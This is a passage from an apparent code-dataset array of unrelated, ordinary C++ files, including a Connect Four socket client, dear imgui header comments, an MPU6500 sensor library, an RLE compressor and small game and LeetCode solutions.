= s.Top(); s.Pop();\r\n            int a = s.Top(); s.Pop();\r\n            s.Push(apply_operator(a, b, ch));\r\n        }\r\n    }\r\n\r\n    return s.Top();\r\n}\r\n\r\nint main() {\r\n    string infix;\r\n    cout << \"Enter an infix expression: \";\r\n    getline(cin, infix);\r\n\r\n    try {\r\n        string postfix = infix_to_postfix(infix);\r\n        int result = evaluate_postfix(postfix);\r\n        cout << \"Result: \" << result << endl;\r\n    } catch (const exception &e) {\r\n        cout << \"Invalid expression\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"Pipe.h\"\n\nPipe::Pipe()\n{\n\tm_sizePipe = { 52.f, 420.f };\n\n\tm_pipe.setFillColor(sf::Color::Green);\n\tm_pipe.setOutlineThickness(-1);\n\tm_pipe.setOutlineColor(sf::Color::Red);\n\tm_pipe.setSize(m_sizePipe);\n\n\tv_posPipes.push_back(sf::Vector2f(600.f, -110.f));\n\tv_posPipes.push_back(sf::Vector2f(600.f, 530.f));\n}\n\nPipe::~Pipe()\n{\n}\n\nstd::vector<sf::Vector2f> Pipe::GetPipes()\n{\n\treturn v_posPipes;\n}\n\nvoid Pipe::Update()\n{\n\tfor (auto& o : v_posPipes) {\n\t\to.x -= 300.f * Tools::GetTimeDelta();\n\t\tif (o.x < -m_sizePipe.x) {\n\t\t\tRemovePipe(v_posPipes[0]);\n\t\t\tRemovePipe(v_posPipes[0]);\n\t\t\tfloat tmp = static_cast<float>(Tools::iRand(-200, 100));\n\t\t\tv_posPipes.push_back(sf::Vector2f(600.f, -110.f + tmp));\n\t\t\tv_posPipes.push_back(sf::Vector2f(600.f, 480.f + tmp));\n\t\t}\n\t}\n}\n\nvoid Pipe::Draw(sf::RenderWindow& _window)\n{\n\tfor (auto o : v_posPipes) {\n\t\tm_pipe.setPosition(o);\n\t\t_window.draw(m_pipe);\n\t}\n}\n\nvoid Pipe::AddPipe(sf::Vector2f _pos)\n{\n\tv_posPipes.push_back(_pos);\n}\n\nvoid Pipe::RemovePipe(sf::Vector2f _pos)\n{\n\tv_posPipes.erase(std::remove_if(v_posPipes.begin(), v_posPipes.end(),\n\t\t[_pos](const sf::Vector2f& pipePos) {\n\t\t\treturn pipePos == _pos;\n\t\t}), v_posPipes.end());\n\n}",
    "// dear imgui, v1.89.7 WIP\n// (main code and documentation)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Newcomers, read 'Programmer guide' below for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for details, links and comments.\n\n// Resources:\n// - FAQ                   http://dearimgui.com/faq\n// - Homepage & latest     https://github.com/ocornut/imgui\n// - Releases & changelog  https://github.com/ocornut/imgui/releases\n// - Gallery               https://github.com/ocornut/imgui/issues/6478 (please post your screenshots/video there!)\n// - Wiki                  https://github.com/ocornut/imgui/wiki (lots of good stuff there)\n// - Glossary              https://github.com/ocornut/imgui/wiki/Glossary\n// - Issues & support      https://github.com/ocornut/imgui/issues\n\n// Getting Started?\n// - For first-time users having issues compiling/linking/running or issues loading fonts:\n//   please post in https://github.com/ocornut/imgui/discussions if you cannot find a solution in resources above.\n\n// Developed by Omar Cornut and every direct or indirect contributors to the GitHub.\n// See LICENSE.txt for copyright and licensing details (standard MIT License).\n// This library is free but needs your support to sustain development and maintenance.\n// Businesses: you can support continued development via invoiced technical support, maintenance and sponsoring contracts. Please reach out to \"contact AT dearimgui.com\".\n// Individuals: you can support continued development via donations. See docs/README or web page.\n\n// It is recommended that you don't modify imgui.cpp! It will become difficult for you to update the library.\n// Note that 'ImGui::' being a namespace, you can add functions into the namespace from your own source files, without\n// modifying imgui.h or imgui.cpp. You may include imgui_internal.h to access internal data structures, but it doesn't\n// come with any guarantee of forward compatibility. Discussing your changes on the GitHub Issue Tracker may lead you\n// to a better solution or official support for them.\n\n/*\n\nIndex of this file:\n\nDOCUMENTATION\n\n- MISSION STATEMENT\n- CONTROLS GUIDE\n- PROGRAMMER GUIDE\n  - READ FIRST\n  - HOW TO UPDATE TO A NEWER VERSION OF DEAR IMGUI\n  - GETTING STARTED WITH INTEGRATING DEAR IMGUI IN YOUR CODE/ENGINE\n  - HOW A SIMPLE APPLICATION MAY LOOK LIKE\n  - HOW A SIMPLE RENDERING FUNCTION MAY LOOK LIKE\n- API BREAKING CHANGES (read me when you update!)\n- FREQUENTLY ASKED QUESTIONS (FAQ)\n  - Read all answers online: https://www.dearimgui.com/faq, or in docs/FAQ.md (with a Markdown viewer)\n\nCODE\n(search for \"[SECTION]\" in the code to find them)\n\n// [SECTION] INCLUDES\n// [SECTION] FORWARD DECLARATIONS\n// [SECTION] CONTEXT AND MEMORY ALLOCATORS\n// [SECTION] USER FACING STRUCTURES (ImGuiStyle, ImGuiIO)\n// [SECTION] MISC HELPERS/UTILITIES (Geometry functions)\n// [SECTION] MISC HELPERS/UTILITIES (String, Format, Hash functions)\n// [SECTION] MISC HELPERS/UTILITIES (File functions)\n// [SECTION] MISC HELPERS/UTILITIES (ImText* functions)\n// [SECTION] MISC HELPERS/UTILITIES (Color functions)\n// [SECTION] ImGuiStorage\n// [SECTION] ImGuiTextFilter\n// [SECTION] ImGuiTextBuffer, ImGuiTextIndex\n// [SECTION] ImGuiListClipper\n// [SECTION] STYLING\n// [SECTION] RENDER HELPERS\n// [SECTION] INITIALIZATION, SHUTDOWN\n// [SECTION] MAIN CODE (most of the code! lots of stuff, needs tidying up!)\n// [SECTION] INPUTS\n// [SECTION] ERROR CHECKING\n// [SECTION] LAYOUT\n// [SECTION] SCROLLING\n// [SECTION] TOOLTIPS\n// [SECTION] POPUPS\n// [SECTION] KEYBOARD/GAMEPAD NAVIGATION\n// [SECTION] DRAG AND DROP\n// [SECTION] LOGGING/CAPTURING\n// [SECTION] SETTINGS\n// [SECTION] LOCALIZATION\n// [SECTION] VIEWPORTS, PLATFORM WINDOWS\n// [SECTION] PLATFORM DEPENDENT HELPERS\n// [SECTION] METRICS/DEBUGGER WINDOW\n// [SECTION] DEBUG LOG WINDOW\n// [SECTION] OTHER DEBUG TOOLS (ITEM PICKER, STACK TOOL)\n\n*/\n\n//-----------------------------------------------------------------------------\n// DOCUMENTATION\n//-----------------------------------------------------------------------------\n\n/*\n\n MISSION STATEMENT\n =================\n\n - Easy to use to create code-driven and data-driven tools.\n - Easy to use to create ad hoc short-lived tools and long-lived, more elaborate tools.\n - Easy to hack and improve.\n - Minimize setup and maintenance.\n - Minimize state storage on user side.\n - Minimize state synchronization.\n - Portable, minimize dependencies, run on target (consoles, phones, etc.).\n - Efficient runtime and memory consumption.\n\n Designed for developers and content-creators, not the typical end-user! Some of the current weaknesses includes:\n\n - Doesn't look fancy, doesn't animate.\n - Limited layout features, intricate layouts are typically crafted in code.\n\n\n CONTROLS GUIDE\n ==============\n\n - MOUSE CONTROLS\n   - Mouse wheel:                   Scroll vertically.\n   - SHIFT+Mouse wheel:             Scroll hor",
    "#include \"resman.h\"\n\n#include <stdexcept>\n#include <SDL_image.h>\n\n#include \"logger.h\"\n\nvoid ResManager::LoadImage(const std::string &name,\n        const std::string &path) {\n    auto image = SDLTexturePtr(\n        IMG_LoadTexture(renderer_.get()/*\u53d6\u5f97render_\u6258\u7ba1\u7684\u6307\u9488SDL_Renderer* */, path.c_str()/*\u83b7\u53d6\u56fe\u7247\u8def\u5f84*/),//\u5c06\u56fe\u7247\u7eb9\u7406\u5bfc\u5165\u5230\u6e32\u67d3\u5668render_\u4e2d\n        [](SDL_Texture *texture) { SDL_DestroyTexture(texture); }/*\u8fd9\u91cc\u662f\u4e00\u4e2aLambda\u8868\u8fbe\u5f0f\uff0c\u4e0d\u4f7f\u7528\u4efb\u4f55\u5916\u90e8\u53d8\u91cf\uff0c\u53c2\u6570\u4e3aSDL_Texture *texture\u8fd4\u56de\u503c\u662f\u7a7a\uff0c\u8bed\u53e5\u4f53\u5f0f\u8c03\u7528\u4e86SDL_DestroyTexture(texture)\u51fd\u6570*/\n    );\n    if (!image) {\n        //\u5982\u679c\u6ca1\u6709\u6210\u529f\u5bfc\u5165\u5c31\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\n        Logger::LogError(\"ResManager::LoadImage\");\n        throw std::runtime_error(\"failed to load image\");//\u629b\u51faruntime_error\u7684\u5f02\u5e38\uff1a\u8f7d\u5165\u56fe\u7247\u662f\u5931\u8d25\n    }\n    images_[name] = image;//\u5efa\u7acb\u4e00\u4e2a\u6620\u5c04\u5173\u7cfb\uff0ckey\u662f\u56fe\u7247\u540d\u5b57\uff0cvalue\u662fSDL_Texture\u6307\u9488\n}\n\nvoid ResManager::LoadFont(const std::string& name,  const std::string& path,int size) {//\u5bfc\u5165\u5b57\u4f53\n\n    TTF_Font* font_ = TTF_OpenFont(path.c_str(), size);\n    if (!font_) {\n            Logger::LogError(\"ResManager::LoadFonts\");\n            throw std::runtime_error(\"failed to load font\");\n            return;\n    }\n    fonts_[name] = font_;\n}\n\nvoid ResManager::LoadBackGroundMusic(const string& name, const string& path)\n{\n    Mix_Music* music = Mix_LoadMUS(path.c_str());\n\n    //\u5224\u65ad\u662f\u5426\u5bfc\u5165\u6210\u529f\n    //\n    if (!music) {\n        Logger::LogError(\"ResManager::LoadBackGroundMusic: Fail to Load\"+name);\n        return;\n    }\n    music_[name] = music;\n}\n\nvoid ResManager::LoadSound(const string& name, const string& path)\n{\n    Mix_Chunk* chunk = Mix_LoadWAV(path.c_str());\n\n    //\u5224\u65ad\u662f\u5426\u5bfc\u5165\u6210\u529f\n    //\n    if (!chunk) {\n        Logger::LogError(\"ResManager::LoadSound : Fail to load chunk\"+name);\n        return;\n    }\n\n    chunks_[name] = chunk;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quotes_app_daily_task\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/*\n@file: gimbal_stepper_test\n@updated: 2024/06/02\n@brief: Controls a pan/tilt gimbal system using NEMA17 stepper motors and A4988 drivers. Motion is controlled via a joystick.\n*/\n\n#include <AccelStepper.h>\n#define NEMA17_MAX_SPEED      500.0     //steps per second\n#define NEMA17_MAX_ACCEL      50.0      //steps per second^2\n#define NEMA17_STEPS_PER_REV  200       //steps per one output revolution\n#define SPEED_REDUCTION       5         //reduce speed by this factor\n\n/******************************* global vars, objects ****************************************/\nconst int PAN_DIR_PIN     = 2;    //pan stepper motor pins\nconst int PAN_STEP_PIN    = 3;\nconst int TILT_DIR_PIN    = 4;    //tilt stepper motor pins\nconst int TILT_STEP_PIN   = 5;\nconst int PAN_PIN         = A0;   //joystick pins (Pan = VRX | Tilt = VRY)\nconst int TILT_PIN        = A1;\n\nconst int JOYSTICK_ZERO   = 430;  //joystick reading at zero position (after calibration)\nconst int THRESHOLD       = 100;   //minimum joystick movement needed to actuate\n\nAccelStepper panStepper(AccelStepper::DRIVER, PAN_STEP_PIN, PAN_DIR_PIN);\nAccelStepper tiltStepper(AccelStepper::DRIVER, TILT_STEP_PIN, TILT_DIR_PIN);\n\n/******************************* void setup ****************************************/\nvoid setup() {\n  //init serial comms \n  Serial.begin(9600);\n  while(!Serial){}\n\n  //init joystick input pins\n  pinMode(PAN_PIN, INPUT);\n  pinMode(TILT_PIN, INPUT);\n\n  //setup stepper motors\n  panStepper.setMaxSpeed(NEMA17_MAX_SPEED);      \n  panStepper.setAcceleration(NEMA17_MAX_ACCEL);      \n  panStepper.setSpeed(200);             \n  Serial.println(\"Pan Motor Ready => \");\n  tiltStepper.setMaxSpeed(NEMA17_MAX_SPEED);        \n  tiltStepper.setAcceleration(NEMA17_MAX_ACCEL);      \n  tiltStepper.setSpeed(200);;\n  Serial.println(\"Tilt Motor Ready => \");\n  delay(250);\n\n  Serial.println(\"Gimbal system ready; move joystick to direct platform.\");\n  Serial.println(\"Up/Down = TILT\\tLEFT/RIGHT = PAN\");\n}\n\n/******************************* void loop ****************************************/\nvoid loop() {\n  int panPos = analogRead(PAN_PIN);\n  int tiltPos = analogRead(TILT_PIN);\n\n  if( abs(panPos - JOYSTICK_ZERO) > THRESHOLD) {\n    int panDirection = (panPos > JOYSTICK_ZERO) ? 1 : -1;\n    panStepper.setSpeed(panDirection*NEMA17_MAX_SPEED/SPEED_REDUCTION);\n  }\n  else{\n    panStepper.setSpeed(0);\n  }\n\n  if( abs(tiltPos - JOYSTICK_ZERO) > THRESHOLD) {\n    int tiltDirection = (tiltPos > JOYSTICK_ZERO) ? 1 : -1;\n    tiltStepper.setSpeed(tiltDirection*NEMA17_MAX_SPEED/SPEED_REDUCTION);\n  }\n  else{\n    tiltStepper.setSpeed(0);\n  }\n\n//todo/ks: allow position control  \n//  for( int i=0; i<180; i++){\n//    panStepper.moveTo(panPos);\n//    tiltStepper.moveTo(tiltPos);\n//    panStepper.run();\n//    tiltStepper.run();\n//  }\n//\n//  for( int j=180; j>0; j-- ){\n//    panStepper.moveTo(panPos);\n//    tiltStepper.moveTo(tiltPos);\n//    panStepper.run();\n//    tiltStepper.run();\n//    delay(100);\n//  }\n\n  panStepper.runSpeed();\n  tiltStepper.runSpeed();\n}",
    "#include <iostream>\n#include <cstring>\n#include <arpa/inet.h>\n#include <unistd.h>\n\nusing namespace std;\n\nint main(int argc, char **argv) {\n    if (argc != 3) {\n        cout << \"Uso: \" << argv[0] << \" <direccion IP> <puerto>\" << endl;\n        return 1;\n    }\n\n    const char* server_ip = argv[1];  // Direcci\u00f3n IP del servidor\n    int port = atoi(argv[2]);  // Puerto del servidor\n    \n    int sock = 0;\n    struct sockaddr_in serv_addr;\n    char buffer[2048] = {0};\n\n    // Crear el socket\n    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {\n        perror(\"Error de creaci\u00f3n de socket\");\n        return -1;\n    }\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_port = htons(port);\n\n    // Convertir la direcci\u00f3n IP a formato binario\n    if (inet_pton(AF_INET, server_ip, &serv_addr.sin_addr) <= 0) {\n        perror(\"Direcci\u00f3n inv\u00e1lida / Direcci\u00f3n no soportada\");\n        return -1;\n    }\n\n    // Conectar al servidor\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {\n        perror(\"Conexi\u00f3n fallida\");\n        return -1;\n    }\n\n    // Bucle principal de comunicaci\u00f3n con el servidor\n    while (true) {\n        memset(buffer, 0, sizeof(buffer));\n        int n = read(sock, buffer, 2048);  // Leer datos del servidor\n        if (n > 0) {\n            cout << buffer;\n\n            // Verificar si el juego ha terminado\n            if (strstr(buffer, \"\u00a1Has ganado!\") || strstr(buffer, \"\u00a1El servidor ha ganado!\") || strstr(buffer, \"Empate\")) {\n                break;\n            }\n\n            // Pedir al usuario que elija una columna\n            if (strstr(buffer, \"Elige una columna (1-7): \")) {\n                int columna;\n                cin >> columna;\n                string movimiento = to_string(columna) + \"\\n\";\n                send(sock, movimiento.c_str(), movimiento.length(), 0);  // Enviar movimiento al servidor\n            }\n        } else if (n == 0) {\n            cout << \"Conexi\u00f3n cerrada por el servidor.\" << endl;\n            break;\n        } else {\n            perror(\"Error de lectura del socket\");\n            break;\n        }\n    }\n\n    // Leer cualquier mensaje final del servidor\n    memset(buffer, 0, sizeof(buffer));\n    int n = read(sock, buffer, 2048);\n    if (n > 0) {\n        cout << buffer;\n    }\n\n    close(sock);  // Cerrar el socket\n    return 0;\n}",
    "class Solution {\r\npublic:\r\n    int orangesRotting(vector<vector<int>>& grid) {\r\n        int n = grid.size();\r\n        int m = grid[0].size();\r\n        queue<pair<pair<int,int>,int>>q; // (r,c), time\r\n        vector<vector<int>>vis(n, vector<int>(m, 0)); // visited matrix.\r\n\r\n        // Time Complexity:- O(n x m)\r\n        // Space Complexity:- O(n x m)\r\n\r\n\r\n        for(int i = 0; i < n; i++)\r\n        {\r\n            for(int j = 0; j < m; j++)\r\n            {\r\n                if(grid[i][j] == 2) // rotten.\r\n                {\r\n                    q.push({{i,j},0}); // starting points in the matrix.\r\n                    vis[i][j] = 2;\r\n                }   \r\n            }\r\n        }\r\n\r\n        int time = 0;\r\n        int drow[] = {-1,0,1,0};\r\n        int dcol[] = {0,1,0,-1};\r\n        while(!q.empty())\r\n        {\r\n            int r = q.front().first.first;\r\n            int c = q.front().first.second;\r\n            int t = q.front().second;\r\n            time = max(t,time);\r\n            q.pop();\r\n\r\n            for(int i = 0; i < 4; i++)\r\n            {\r\n                int nr = r + drow[i];\r\n                int nc = c + dcol[i];\r\n                if(nr >= 0 && nr < n && nc >= 0 && nc < m && grid[nr][nc] == 1 && !vis[nr][nc])\r\n                {\r\n                    q.push({{nr,nc},t + 1});\r\n                    vis[nr][nc] = 2;\r\n                }\r\n            }\r\n        }\r\n\r\n        for(int i = 0; i < n; i++)\r\n        {\r\n            for(int j = 0; j < m; j++)\r\n            {\r\n                if(grid[i][j] == 1)\r\n                {\r\n                    if((vis[i][j] != 2))\r\n                    {\r\n                        return -1;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        return time;\r\n    }\r\n};",
    "/********************************************************************\r\n* \r\n* This is a library for the 6-axis gyroscope and accelerometer MPU6500.\r\n*\r\n* You'll find an example which should enable you to use the library.\r\n*\r\n* You are free to use it, change it or build on it. In case you like\r\n* it, it would be cool if you give it a star.\r\n*\r\n* If you find bugs, please inform me!\r\n*\r\n* Written by Wolfgang (Wolle) Ewald\r\n*\r\n* For further information visit my blog:\r\n*\r\n* https://wolles-elektronikkiste.de/mpu9250-9-achsen-sensormodul-teil-1  (German)\r\n* https://wolles-elektronikkiste.de/en/mpu9250-9-axis-sensor-module-part-1  (English)\r\n*\r\n*********************************************************************/\r\n\r\n#include \"MPU6500_WE.h\"\r\n\r\n/* Registers MPU6500 */\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_X_GYRO     ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_Y_GYRO     ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_Z_GYRO     ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_X_ACCEL    ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_Y_ACCEL    ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SELF_TEST_Z_ACCEL    ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_XG_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_XG_OFFSET_L          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_YG_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_YG_OFFSET_L          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ZG_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ZG_OFFSET_L          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SMPLRT_DIV           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_CONFIG               ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_GYRO_CONFIG          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ACCEL_CONFIG         ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ACCEL_CONFIG_2       ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_LP_ACCEL_ODR         ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_WOM_THR              ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_FIFO_EN              ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_MST_CTRL         ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_SLV0_ADDR        ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_SLV0_REG         ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_SLV0_CTRL        ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_MST_STATUS       ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_INT_PIN_CFG          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_INT_ENABLE           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_INT_STATUS           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ACCEL_OUT            ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_TEMP_OUT             ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_GYRO_OUT             ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_EXT_SLV_SENS_DATA_00 ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_SLV0_DO          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_I2C_MST_DELAY_CTRL   ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_SIGNAL_PATH_RESET    ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_MOT_DET_CTRL         ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_USER_CTRL            ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_PWR_MGMT_1           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_PWR_MGMT_2           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_FIFO_COUNT           ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_FIFO_R_W             ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_WHO_AM_I             ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_XA_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_XA_OFFSET_L          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_YA_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_YA_OFFSET_L          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ZA_OFFSET_H          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_ZA_OFFSET_L          ;\r\n\r\n/* Register Values */\r\nuint8_t constexpr MPU6500_WE::REGISTER_VALUE_RESET          ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_VALUE_BYPASS_EN      ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_VALUE_I2C_MST_EN     ;\r\nuint8_t constexpr MPU6500_WE::REGISTER_VALUE_CLK_SEL_PLL    ;\r\n\r\n/* Others */\r\nfloat constexpr MPU6500_WE::ROOM_TEMPERATURE_OFFSET         ;\r\nfloat constexpr MPU6500_WE::TEMPERATURE_SENSITIVITY         ;\r\nfloat constexpr MPU6500_WE::WHO_AM_I_CODE                   ;\r\n\r\n/************  Constructors ************/\r\n\r\nMPU6500_WE::MPU6500_WE(uint8_t addr)\r\n    : MPU6500_WE(&Wire, addr)\r\n{\r\n    // intentionally empty\r\n}\r\n\r\nMPU6500_WE::MPU6500_WE(TwoWire *w, uint8_t addr)\r\n    : _wire(w)\r\n    , i2cAddress(addr)\r\n{\r\n    // intentionally empty\r\n}\r\n\r\nMPU6500_WE::MPU6500_WE(SPIClass *s, int cs, bool spi)\r\n    : _spi(s)\r\n    , csPin(cs)\r\n    , useSPI(spi)\r\n{\r\n    // intentionally empty\r\n}\r\n\r\n\r\n/************ Basic Settings ************/\r\n\r\nbool MPU6500_WE::init(uint8_t const expectedValue){\r\n    if(useSPI){\r\n        pinMode(csPin, OUTPUT);\r\n        digitalWrite(csPin, HIGH);\r\n        _spi->begin();\r\n        mySPISettings = SPISettings(8000000, MSBFIRST, SPI_MODE0);      \r\n    }   \r\n    reset",
    "#include \"FLSRLEInterface.hpp\"\n#include \"utils.hpp\"\n#include <arrow/util/bit_util.h>\n#include <cstdint>\n\nnamespace null_revisit {\nFLSRLEInterface::FLSRLEInterface()\n    : FLSInterface(), word_size_(4), bitpacker_() {}\nsize_t FLSRLEInterface::compress(std::string_view src,\n                                 arrow::ResizableBuffer *dst,\n                                 const std::vector<bool> &nulls) {\n    return compress_template<false>(src, dst, nulls);\n}\n\nsize_t FLSRLEInterface::compress_dense(std::string_view src,\n                                       arrow::ResizableBuffer *dst) {\n    return compress_template<true>(src, dst, {});\n}\n\ntemplate <bool dense>\nsize_t FLSRLEInterface::compress_template(std::string_view src,\n                                          arrow::ResizableBuffer *dst,\n                                          const std::vector<bool> &nulls) {\n    size_t n = src.size() / word_size_;\n    std::vector<uint32_t> rle_values, rle_idxs;\n    uint32_t idx = 0;\n    rle_values.reserve(n);\n    rle_idxs.reserve(n);\n    auto src_ptr = (const uint32_t *)src.data();\n    uint32_t last = src_ptr[0];\n    rle_idxs.push_back(idx);\n    rle_values.push_back(last);\n    for (size_t i = 1; i < n; i++) {\n        // Read 4 bytes as a uint32_t\n        uint32_t val = src_ptr[i];\n        bool flag = true;\n        if constexpr (!dense) {\n            flag = nulls[i] == false;\n        }\n        if (val != last && flag) {\n            last = val;\n            rle_values.push_back(last);\n            idx++;\n        }\n        rle_idxs.push_back(idx);\n    }\n    // Compress rle_values and rle_lengths using Bitpacking\n    const auto values_size = bitpacker_.compress_no_resize(\n        std::string_view((const char *)rle_values.data(),\n                         rle_values.size() * sizeof(uint32_t)),\n        (char *)dst->mutable_data() + sizeof(uint32_t));\n    // Write values_size into dst\n    *(reinterpret_cast<uint32_t *>(dst->mutable_data())) = values_size;\n    auto bw =\n        *(uint8_t *)(dst->mutable_data() + values_size - 1 + sizeof(uint32_t));\n    // Compress rle_idxs into dst\n    const auto idxs_size = delta_.compress_no_resize(\n        std::string_view((const char *)rle_idxs.data(),\n                         rle_idxs.size() * sizeof(uint32_t)),\n        (char *)dst->mutable_data() + sizeof(uint32_t) + values_size);\n    const auto dst_buf_size = sizeof(uint32_t) + values_size + idxs_size;\n    dst->Resize(dst_buf_size);\n    // TODO: hacky way to make compression ratio correct.\n    return sizeof(uint32_t) +\n           arrow::bit_util::BytesForBits(bw * rle_values.size()) + idxs_size;\n}\n\nsize_t FLSRLEInterface::compress_with_null(std::string_view src,\n                                           arrow::ResizableBuffer *dst,\n                                           const std::vector<bool> &nulls) {\n    throw std::logic_error(\n        \"FLSRLEInterface::compress_with_null Not implemented\");\n}\n\nsize_t FLSRLEInterface::decompress(std::string_view src, char *const dst,\n                                   size_t dst_size) {\n    return decompress_template<false>(src, dst, dst_size);\n}\n\nsize_t FLSRLEInterface::decompress_untranspose(std::string_view src, char *dst,\n                                               size_t dst_size) {\n    return decompress_template<true>(src, dst, dst_size);\n}\n\ntemplate <bool untrans>\nsize_t FLSRLEInterface::decompress_template(std::string_view src, char *dst,\n                                            size_t dst_size) {\n    auto src_ptr = reinterpret_cast<const uint8_t *>(src.data());\n    const auto values_size = *(reinterpret_cast<const uint32_t *>(src_ptr));\n    src_ptr += sizeof(uint32_t);\n    // Decompress values using Bitpacking\n    bitpacker_.decompress(std::string_view((const char *)src_ptr, values_size),\n                          (char *)rle_values, 0);\n    src_ptr += (values_size);\n    // Decompress idxes using Delta\n    size_t idxs_buf_size;\n    if constexpr (untrans) {\n        idxs_buf_size = delta_.decompress_untranspose(\n            std::string_view((const char *)src_ptr,\n                             src.size() - values_size - sizeof(uint32_t)),\n            (char *)rle_idxs, 0);\n    } else {\n        idxs_buf_size = delta_.decompress(\n            std::string_view((const char *)src_ptr,\n                             src.size() - values_size - sizeof(uint32_t)),\n            (char *)rle_idxs, 0);\n    }\n    // Decode rle_values and rle_idxs\n    uint32_t *__restrict dst_ptr = std::assume_aligned<64>((uint32_t *)dst);\n    auto bound = idxs_buf_size / sizeof(uint32_t);\n    size_t i = 0;\n    for (; i <= bound - 512; i += 512) {\n        UnrolledRLEDecoding512Values(dst_ptr + i, rle_values, rle_idxs + i);\n    }\n    for (; i <= bound - 16; i += 16) {\n        UnrolledRLEDecoding16Values(dst_ptr + i, rle_values, rle_idxs + i);\n    }\n    for (; i < bound; i++) {\n        dst_ptr[i] = rle_values[rle_idxs[i]];\n    }\n    /*\n    assert(bound % 16 == 0);\n    for (size_t i = 0; i < bound; i += 16) {\n        // Load 16",
    "#include \"global.h\"\n\nunsigned int hash(int height, int nonce, time_t timestamp, unsigned int last_hash, int id) {\n    std::string data_to_hash = std::to_string(height) + std::to_string(nonce) + std::to_string(timestamp) +\n                               std::to_string(last_hash) + std::to_string(id);\n    uLong crc_res = 0;\n    crc_res = crc32(crc_res, reinterpret_cast<const Bytef *>(data_to_hash.c_str()), data_to_hash.size());\n    //reinterpret cast is used to cast the pointer.\n    return crc_res;\n}\n\nvoid processArguments(int number_of_arguments, char *the_arguments[]) {\n    try {\n        if (number_of_arguments < 2) {\n            //We did not get the difficulty\n            throw std::string(\"No argument provided***\\nPlease run the program again with difficulty number.\\n\");\n        }\n\n        int difficulty = std::stoi(the_arguments[1]);\n\n        if (difficulty <= 0) {\n            throw std::string(\n                \"Difficulty has to be positive!***\\nPlease run the program again with difficulty 